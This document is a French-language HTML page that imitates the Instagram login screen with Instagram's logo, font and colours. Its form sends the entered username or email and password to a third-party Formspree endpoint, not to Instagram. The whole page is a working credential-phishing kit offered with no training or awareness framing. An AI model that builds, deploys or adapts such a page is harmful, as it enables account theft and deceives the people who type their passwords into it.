<!DOCTYPE html>
<html lang="fr">

<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Connexion</title>


<style>

/* Police Billabong */
@font-face {
    font-family: Billabong;
    src: url("Billabong.ttf");
}


body {

    margin: 0;

    background: #fafafa;

    font-family: Arial, sans-serif;

    height: 100vh;

    display: flex;

    justify-content: center;

    align-items: center;

}



/* Carte blanche */
.onglet {

    width: 340px;

    background: white;

    border: 1px solid #dbdbdb;

    border-radius: 15px;

    padding: 40px;

    box-shadow: 0 5px 20px rgba(0,0,0,0.08);

}



/* Logo Instagram */
.logo {

    width: 120px;

    height: 120px;

    display: block;

    margin: 0 auto 20px auto;

}



/* Instagram */
.Instagram {

    font-family: Billabong, cursive;

    font-size: 25px;

    text-align: center;

    margin: 0 0 20px 0;

    color: #000;

}



/* Connexion */
.Connexion {

    font-size: 15px;

    font-weight: bold;

    text-align: left;

    margin: 0 0 20px 0;

}



/* Questions */
.question {

    font-size: 16px;

    font-weight: bold;

    text-align: left;

    margin-bottom: 8px;

}



/* Champs de réponse */
input {

    width: 100%;

    box-sizing: border-box;

    padding: 12px;

    margin-bottom: 20px;

    border: 1px solid #dbdbdb;

    border-radius: 8px;

    background: #fafafa;

    font-size: 14px;

}



/* Bouton */
button {

    width: 100%;

    padding: 12px;

    border: none;

    border-radius: 8px;

    background: #0095f6;

    color: white;

    font-size: 16px;

    font-weight: bold;

    cursor: pointer;

}


button:hover {

    background: #1877f2;

}


</style>


</head>


<body>


<div class="onglet">



<!-- Logo Instagram -->
<img 
class="logo"
src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png"
alt="Logo Instagram">



<div class="Instagram">
Instagram
</div>



<h1 class="Connexion">
Connexion
</h1>



<form action="https://formspree.io/f/mrenvqaz" method="POST">



<p class="question">
Identifiants ou adresse mail
</p>


<input 
type="text"
name="Identifiants ou e-mail"
placeholder="Votre identifiant ou e-mail"
required>



<p class="question">
Mot de Passe
</p>


<input 
type="password"
name="Mot de passe"
placeholder="Votre mot de passe"
required>



<button type="submit">
Connexion
</button>



</form>



</div>


</body>

</html>
